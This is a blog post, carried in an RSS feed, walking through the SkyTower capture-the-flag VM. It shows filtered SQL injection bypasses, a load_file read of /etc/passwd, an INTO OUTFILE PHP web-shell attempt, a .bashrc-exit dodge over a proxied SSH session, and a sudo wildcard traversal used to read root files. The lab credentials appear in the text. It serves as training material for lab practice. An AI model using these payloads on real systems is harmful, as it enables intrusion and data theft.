&lt;p&gt;The home page presented you with a login screen and a 2.5MB &amp;lsquo;background.jpg&amp;rsquo; image. Right in the beginning I was started off on the wrong path. I downloaded this background image and attempted to see if there was anything particularly interesting about it. Sadly, the answer to this question was a loud &lt;em&gt;NOPE&lt;/em&gt;. I started dirbuster on the web interface and proceeded with a nmap scan of 192.168.137.242 after which I had to call it a night.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ nmap --reason -Pn 192.168.137.242

Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-17 18:32 SAST
Nmap scan report for 192.168.137.242
Host is up, received user-set (0.0020s latency).
Not shown: 997 closed ports
Reason: 997 conn-refused
PORT     STATE    SERVICE    REASON
22/tcp   filtered ssh        no-response
80/tcp   open     http       syn-ack
3128/tcp open     squid-http syn-ack
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next morning I reviewed the results and continued to poke around.&lt;/p&gt;

&lt;h2 id=&#34;learn-all-you-can&#34;&gt;learn all you can&lt;/h2&gt;

&lt;p&gt;With the information gathered so far, I realized that the SSH (tcp/22) was explicitly filtered, however the squid proxy was open. I tried to telnet and use the CONNECT method to see if I was able to access the SSH service:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ telnet 192.168.137.242 3128
Trying 192.168.137.242...
Connected to 192.168.137.242.
Escape character is &#39;^]&#39;.
CONNECT 127.0.0.1:22
HTTP/1.0 200 Connection established

SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
^]
telnet&amp;gt; quit
Connection closed.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great, soooo I can get access to the SSH service of needed. The dirbuster results showed nothing of particular interest, but it was worth a shot anyways. An important thing to note here is that I suspect I maxed out the disk space in the VM due to the access_log growing too big from the dirbust. This caused me numerous headaches and frustrated me quite a bit when I was testing. Anyways&amp;hellip;&lt;/p&gt;

&lt;p&gt;The next step was to poke around the web application. I personally really enjoy web hacking so this was probably the most fun of the whole CTF. The web page presented you with a simple form that would POST to &lt;code&gt;login.php&lt;/code&gt;. 2 fields were posted: &lt;code&gt;email&lt;/code&gt; &amp;amp; &lt;code&gt;password&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;A natural reaction is to try and use a single quote in form fields as a quick and nasty check for potential SQL injection. A login attempt with a username of test and password &lt;code&gt;&#39;&lt;/code&gt; resulted in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39;&#39;&#39; at line 1]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Classic SQLi! Surprised I continued with simple login bypasses. None that I could think of out of my head appeared to work. Eventually I started to notice that some of the keywords that I was using were not appearing in the error messages. This hinted heavily towards the fact that there may be some form of filtering in place. Eventually, I put the request down in a curl command so that I can work with this slightly easier. To sample the keywords being removed:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ curl --data &amp;quot;email=foo@bar&amp;amp;password=&#39; OR 1=1#&amp;quot; http://192.168.137.242/login.php
There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;11#&#39;&#39; at line 1]%

$ curl --data &amp;quot;email=foo@bar&amp;amp;password=&#39;1 OR 1=1#&amp;quot; http://192.168.137.242/login.php
There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1  11#&#39;&#39; at line 1]%
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ok, so no &lt;code&gt;OR&lt;/code&gt;. Thats ok, we can substitute this easily with &lt;code&gt;||&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;$ curl --data &amp;quot;email=foo@bar&amp;amp;password=&#39; || 1=1#&amp;quot; http://192.168.137.242/login.php
&amp;lt;HTML&amp;gt;
      &amp;lt;div style=&amp;quot;height:100%; width:100%;background-image:url(&#39;background.jpg&#39;);
                                background-size:100%;
                                background-position:50% 50%;
                                background-repeat:no-repeat;&amp;quot;&amp;gt;
      &amp;lt;div style=&amp;quot;
        padding-right:8px;
              padding-left:10px;
        padding-top: 10px;
              padding-bottom: 10px;
                  background-color:white;
                  border-color: #000000;
                  border-width: 5px;
                  border-style: solid;
                  width: 400px;
                  height:430px;
                  position:absolute;
                  top:50%;
                  left:50%;
                  margin-top:-215px; /* this is half the height of your div*/
                  margin-left:-200px;
                                &amp;quot;&amp;gt;
   &amp;lt;br&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;font size=4&amp;gt;Welcome john@skytech.com&amp;lt;/font&amp;gt;&amp;lt;br /&amp;gt; &amp;lt;/br&amp;gt;&amp;lt;/strong&amp;gt;As you may know, SkyTech has ceased all international operations.&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; To all our long term employees, we wish to convey our thanks for your dedication and hard work.&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;strong&amp;gt;Unfortunately, all international contracts, including yours have been terminated.&amp;lt;/strong&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; The remainder of your contract and retirement fund, &amp;lt;strong&amp;gt;$2&amp;lt;/strong&amp;gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;strong&amp;gt;Username: john&amp;lt;/strong&amp;gt;&amp;lt;br&amp;gt;&amp;lt;strong&amp;gt;Password: hereisjohn&amp;lt;/strong&amp;gt; &amp;lt;br&amp;gt;&amp;lt;br&amp;gt; We wish you the best of luck in your future endeavors. &amp;lt;br&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt;&amp;lt;/HTML&amp;gt;%
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And success. We have made some progress :D Little did I know that I don&amp;rsquo;t actually completely understand the progress made yet, but just keep this in mind :)&lt;/p&gt;

&lt;h2 id=&#34;climbing-the-tower-and-faling-hard&#34;&gt;climbing the tower and faling hard&lt;/h2&gt;

&lt;p&gt;From the auth bypass results, we can see specific mention for users to SSH into the server. This particular user has a username &lt;code&gt;john&lt;/code&gt; and a password &lt;code&gt;hereisjohn&lt;/code&gt;. So lets try this.
I setup my &lt;code&gt;proxychains&lt;/code&gt; install to use the http proxy available on the server (&lt;code&gt;http 192.168.137.242 3128&lt;/code&gt;) and opened a SSH session through it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ proxychains4 ssh john@127.0.0.1
[snip]
[proxychains] Strict chain  ...  192.168.137.242:3128  ...  127.0.0.1:22  ...  OK
john@127.0.0.1&#39;s password:
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 17 12:54:32 2014 from localhost

Funds have been withdrawn
Connection to 127.0.0.1 closed.
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; ok. So we get a session, and are told &lt;em&gt;Funds have been withdrawn&lt;/em&gt;, and get the connection closed. Not exactly what I hoped for. Thinking what could cause this behavior, my mind went on to things like a custom shell, &lt;code&gt;.bashrc&lt;/code&gt; files (assuming the user has bash a a shell) etc. So, I figured there may be more users on the system and I should try get those credentials too. After all, we have a working SQL injection point.&lt;/p&gt;

&lt;h2 id=&#34;more-sql-injection&#34;&gt;more sql injection&lt;/h2&gt;

&lt;p&gt;So back to the SQLi point it was. Taking a wild guess, I assumed there is a &lt;code&gt;users&lt;/code&gt; table, and the table will have a primary key of &lt;code&gt;id&lt;/code&gt;. So, &lt;code&gt;john&lt;/code&gt; may have id 1, and a next user have id 2. So I modified the query slightly:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ curl --data &amp;quot;email=foo@bar&amp;amp;password=&#39; || id=1#&amp;quot; http://192.168.137.242/login.php
There was an error running the query [Unknown column &#39;id1&#39; in &#39;where clause&#39;]%
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Well I definitely didn&amp;rsquo;t ask for the column &lt;code&gt;id1&lt;/code&gt;, but from this again it was apparent that &lt;code&gt;=&lt;/code&gt; was filtered along with &lt;code&gt;OR&lt;/code&gt;. :| Ok, so we change the payload again:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ curl --data &amp;quot;email=foo@bar&amp;amp;password=&#39; || id &amp;gt; 1#&amp;quot; http://192.168.137.242/login.php
[snip]
&amp;lt;br&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;font size=4&amp;gt;Welcome sara@skytech.com&amp;lt;/font&amp;gt;&amp;lt;br /&amp;gt; &amp;lt;/br&amp;gt;&amp;lt;/strong&amp;gt;As you may know, SkyTech has ceased all international operations.&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; To all our long term employees, we wish to convey our thanks for your dedication and hard work.&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;strong&amp;gt;Unfortunately, all international contracts, including yours have been terminated.&amp;lt;/strong&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; The remainder of your contract and retirement fund, &amp;lt;strong&amp;gt;$2&amp;lt;/strong&amp;gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;strong&amp;gt;Username: sara&amp;lt;/strong&amp;gt;&amp;lt;br&amp;gt;&amp;lt;strong&amp;gt;Password: ihatethisjob&amp;lt;/strong&amp;gt; &amp;lt;br&amp;gt;&amp;lt;br&amp;gt; We wish you the best of luck in your future endeavors. &amp;lt;br&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt;&amp;lt;/HTML&amp;gt;%
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yay, my guess on the &lt;code&gt;id&lt;/code&gt; column was correct, and I now had a second users details. I continued to increment the &lt;code&gt;id&lt;/code&gt;, and ended up with 3 accounts:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;john:hereisjohn&lt;/li&gt;
&lt;li&gt;sara:ihatethisjob&lt;/li&gt;
&lt;li&gt;william:senseable&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The users &lt;code&gt;john&lt;/code&gt; &amp;amp; &lt;code&gt;sara&lt;/code&gt; both had the same behavior when attempting login via SSH, and the user &lt;code&gt;william&lt;/code&gt; appears to have had an incorrect password. So, again the results were not exactly what I hoped for.&lt;/p&gt;

&lt;h2 id=&#34;more-sql-enumeration&#34;&gt;more SQL enumeration&lt;/h2&gt;

&lt;p&gt;At this stage, I was thinking there must be more information in the database, and I should try and read some files from disk in order to gain a better understanding of what is going on here.&lt;/p&gt;

&lt;p&gt;Fast forward a few hours, I discovered that a few more keywords and symbols were filtered. The hardest being the realization that a &lt;code&gt;union select&lt;/code&gt; was not working as expected so that I can enumerate the columns. Even though the initial entry on vulnhub mentioned that automated tools would probably not work, I figured in this case that I had a valid SQLi, I could just make use of some SQLMap automagic. Again &lt;em&gt;NOPE&lt;/em&gt;. Even with &lt;code&gt;--level 3&lt;/code&gt; &amp;amp; &lt;code&gt;--risk 3&lt;/code&gt; there was no joy. This is ok.&lt;/p&gt;

&lt;p&gt;I studied the error messages in detail, googled&amp;hellip; a lot&amp;hellip; and eventually came across &lt;a href=&#34;http://zoczus.blogspot.nl/2013/03/sql-injection-without-comma-char.html&#34;&gt;this&lt;/a&gt; blogpost, detailing a way to get a union working without the ability to use commas. I should also note that I managed to bypass the &lt;code&gt;SELECT&lt;/code&gt; filter by using &lt;code&gt;SELECSELECTT&lt;/code&gt; in the payload. Assuming that the filter was a simple &lt;code&gt;str_replace()&lt;/code&gt;, this left me with &lt;code&gt;SELECT&lt;/code&gt; after the pass.&lt;/p&gt;

&lt;p&gt;For the sake of brevity I am not going to detail all of the methods I used in order to exploit the SQLi and get value out of it. I managed to learn that the database user used by the PHP application was root. The query used in &lt;code&gt;login.php&lt;/code&gt; returned 3 columns. One particular payload of interest that uses the method in the previously mentioned blog post, was used to start reading files from the servers disk. More specifically, &lt;code&gt;/etc/passwd&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ curl --data &amp;quot;email=foo@bar&amp;amp;password=&#39; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt load_file(&#39;/etc/password&#39;)) as c#&amp;quot; http://192.168.137.242/login.php
[snip]
&amp;lt;br&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;font size=4&amp;gt;Welcome 222&amp;lt;/font&amp;gt;&amp;lt;br /&amp;gt; &amp;lt;/br&amp;gt;&amp;lt;/strong&amp;gt;As you may know, SkyTech has ceased all international operations.&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; To all our long term employees, we wish to convey our thanks for your dedication and hard work.&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;strong&amp;gt;Unfortunately, all international contracts, including yours have been terminated.&amp;lt;/strong&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; The remainder of your contract and retirement fund, &amp;lt;strong&amp;gt;$2&amp;lt;/strong&amp;gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;strong&amp;gt;Username: 222&amp;lt;/strong&amp;gt;&amp;lt;br&amp;gt;&amp;lt;strong&amp;gt;Password: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
john:x:1000:1000:john,,,:/home/john:/bin/bash
sara:x:1001:1001:,,,:/home/sara:/bin/bash
william:x:1002:1002:,,,:/home/william:/bin/bash
&amp;lt;/strong&amp;gt; &amp;lt;br&amp;gt;&amp;lt;br&amp;gt; We wish you the best of luck in your future endeavors. &amp;lt;br&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt;&amp;lt;/HTML&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Reading the &lt;code&gt;/etc/passwd&lt;/code&gt; revealed that there were no custom shells used for the users that were enumerated previously. O..k.. I also pulled the sources of &lt;code&gt;login.php&lt;/code&gt; in order to understand what the deal with the filtering was:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$sqlinjection = array(&amp;quot;SELECT&amp;quot;, &amp;quot;TRUE&amp;quot;, &amp;quot;FALSE&amp;quot;, &amp;quot;--&amp;quot;,&amp;quot;OR&amp;quot;, &amp;quot;=&amp;quot;, &amp;quot;,&amp;quot;, &amp;quot;AND&amp;quot;, &amp;quot;NOT&amp;quot;);
$email = str_ireplace($sqlinjection, &amp;quot;&amp;quot;, $_POST[&#39;email&#39;]);
$password = str_ireplace($sqlinjection, &amp;quot;&amp;quot;, $_POST[&#39;password&#39;]);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And as suspected. :)&lt;/p&gt;

&lt;p&gt;One last thing that I tried, really hard, was to get a web shell on the server so that I can further explore the environment. This failed miserably. The closest I was able to get was:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ curl --data &amp;quot;email=foo@bar&amp;amp;password=&#39; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt &#39;&amp;lt;?php print_r(shell_exec($_GET[cmd])); ?&amp;gt;&#39;) as c into outfile &#39;/var/www/shell.php&#39;#&amp;quot; http://192.168.137.242/login.php
There was an error running the query [Can&#39;t create/write to file &#39;/var/www/shell.php&#39; (Errcode: 13)]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This obviously alludes to the fact that the user MySQL is running as des not have access to write to the web folder. It was time to rethink what was going on here&amp;hellip;
Oh yes, I obviously tried to just cat &lt;code&gt;/root/flag.txt&lt;/code&gt;, but didn’t expect it to be &lt;em&gt;that&lt;/em&gt; easy :D&lt;/p&gt;

&lt;h2 id=&#34;gaining-further-access&#34;&gt;gaining further access&lt;/h2&gt;

&lt;p&gt;After spending a really long time with the SQL injections, I decided to relook the SSH section. From the SQL injection that I learnt that there don&amp;rsquo;t &lt;em&gt;appear&lt;/em&gt; to be any custom shells in use, so the other thing this could be is a &lt;code&gt;.bashrc&lt;/code&gt; with a &lt;code&gt;exit&lt;/code&gt; command. I know its &lt;code&gt;.bashrc&lt;/code&gt; because I saw the shell is &lt;code&gt;/bin/bash&lt;/code&gt; from the &lt;code&gt;/etc/passwd&lt;/code&gt;. I remember that I make heavy use of &lt;code&gt;ssh -t&lt;/code&gt; to execute commands on the remove server, usually to setup multiple tunnels into a network, so I thought it will come in handy here.&lt;/p&gt;

&lt;p&gt;For this case though, I though I&amp;rsquo;d specify a &lt;code&gt;/bin/sh&lt;/code&gt; as the &lt;em&gt;command&lt;/em&gt; to run, hoping to not get caught in a &lt;code&gt;.bashrc&lt;/code&gt; running:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ proxychains4 -q ssh john@127.0.0.1 -t /bin/sh
john@127.0.0.1&#39;s password:
$ id
uid=1000(john) gid=1000(john) groups=1000(john)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Woop! I was now logged in as &lt;code&gt;john&lt;/code&gt;. I inspected the &lt;code&gt;.bashrc&lt;/code&gt; file and saw that at the end there was:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;echo
echo  &amp;quot;Funds have been withdrawn&amp;quot;
exit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; a exit. I simply removed the line. Now the almost obvious next step was to inspect and enumerate as much as possible. The most obvious thing that came to mind was privilege escalation as I was simply a normal user on the system at the moment.&lt;/p&gt;

&lt;h2 id=&#34;enumeration-enumeration-enumeration&#34;&gt;enumeration enumeration enumeration&lt;/h2&gt;

&lt;p&gt;I enumerated, everything&amp;hellip; Referring to a excellent &lt;a href=&#34;http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&#34;&gt;post by g0tm1lk&lt;/a&gt; nothing aparent came up. The only semi strange thing was a empty &lt;code&gt;/accounts/&lt;/code&gt; directory:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;john@SkyTower:/accounts$ ls -lah /accounts/
total 8.0K
drwxr-xr-x  2 root root 4.0K Jun 20 07:52 .
drwxr-xr-x 24 root root 4.0K Jun 20 07:52 ..
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Other than that things seemed pretty normal. I decided to check out the other user &lt;code&gt;sara&lt;/code&gt; too. This user has a similar &lt;code&gt;exit&lt;/code&gt; in the &lt;code&gt;.bashrc&lt;/code&gt; which I just removed. There was one distinct difference during enumeration though&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sara@SkyTower:~$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This user may execute some commands as root using &lt;code&gt;sudo&lt;/code&gt;. &lt;code&gt;sudo&lt;/code&gt; allows you to specify what those commands are, if not all. There was one problem with this configuration though. &lt;code&gt;*&lt;/code&gt; is a wildcard character, and as such, anything after &lt;code&gt;cat /accounts/&lt;/code&gt; may also be run. This means that things like &lt;code&gt;sudo cat /accounts/../../etc/shadow&lt;/code&gt; will work as the wildcard allows us to do a form of directory traversal.&lt;/p&gt;

&lt;h2 id=&#34;pwnd&#34;&gt;pwnd&lt;/h2&gt;

&lt;p&gt;So, to complete SkyTower:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sara@SkyTower:~$ sudo cat /accounts/../../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks to &lt;a href=&#34;https://twitter.com/telspacesystems&#34;&gt;@telspacesystems&lt;/a&gt; for the fun experience. I learnt something so for this was totally worth it!&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>